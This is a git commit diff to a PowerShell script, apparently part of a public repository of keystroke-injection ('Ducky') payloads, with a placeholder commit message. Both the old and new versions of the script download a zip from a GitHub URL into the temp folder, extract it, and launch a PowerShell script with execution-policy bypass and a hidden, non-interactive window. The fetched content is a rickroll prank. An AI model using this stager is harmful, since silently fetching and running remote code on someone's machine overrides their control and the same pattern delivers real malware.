7144a26ce558852e66d0a42267e5d54bd5a79ff6
Eric <200495807+JestingDart4369@users.noreply.github.com>
2026-06-12 07:52:49 +0000

    lorem

--- WRV-run.ps1
+++ WRV-run.ps1
@@ -1,5 +1,6 @@
 $U='https://github.com/JestingDart4369/Ducky-script-public/blob/main/Windows-rickroll-vido.zip?raw=true'
 $Z="$env:TMP"+'\Windows-rickroll-vido.zip'
-$D="$env:TMP"+'\Windows-rickroll-video'
+$D="$env:TMP"+'\Windows-rickroll-vido'
 iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force
-powershell $D\Windows-rickroll-vido\Windows-rickroll-video-player.ps1 -exec Bypass -w h -NoP -NonI
+$c= join-path $d -child \Windows-rickroll-vido -child \Windows-rickroll-video-player.ps1
+powershell $c -exec Bypass -w h -NoP -NonI
